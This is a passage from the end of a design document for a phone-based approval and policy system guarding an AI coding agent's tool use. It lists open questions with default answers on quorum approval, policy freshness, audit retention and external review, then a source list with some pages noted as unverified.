- Q-S3. Amend I1 for standing rules (§5.7), or ship v2.0 with only friction-based scoring and session-scope "Always"? Default: do not amend for 2.0; amend in 2.1 after W-S1.
- Q-S4. Quorum default off, enabled per policy class? Default: off; recommended preset for `Bash` outside project root and for `enroll`.
- Q-S5. Policy freshness TTL 14 days and peer lease 30 days for team peers? Default: yes; none for single-owner pairings.
- Q-S6. Minimum two `owner` principals per team to avoid biometric-invalidation lock-out? Default: warn at pairing, do not enforce.
- Q-S7. Audit retention on the agent (default 180 days, rotated files, chain continues across files)? Default: 180 days.
- Q-S8. Is an external review of the quorum/policy/enroll code a precondition for calling v2 "team-ready"? Default: yes before any paid tier.
- Q-S9. Hardware attestation in 2.x: do we accept a dependency-budget exception for X.509/CBOR parsing in a separate optional module? Default: defer.

## 9. Sources

- https://developer.android.com/privacy-and-security/keystore (fetched; V1)
- https://developer.apple.com/documentation/cryptokit/secureenclave (page body did not render; A1 unverified)
- https://developer.apple.com/documentation/devicecheck/establishing-your-app-s-integrity (page body did not render; A2 unverified)
- v1 report sources by reference: https://code.claude.com/docs/en/hooks, https://code.claude.com/docs/en/permissions, https://noiseprotocol.org/noise.html, https://developer.mozilla.org/en-US/docs/Web/API/AuthenticatorAssertionResponse/signature, https://raw.githubusercontent.com/Louis-CFM/coucou/main/docs/ANDROID_LINK.md
- Local: `docs/analysis/reports/02-security.md`, `docs/analysis/ROADMAP.md` §1, D3, D7, D8, D13, D24, D25, `docs/adr/0010-agent-side-assertion-check.md`, `docs/adr/0016-staging-and-shared-challenges.md`, `docs/adr/0017-native-phone-app.md`
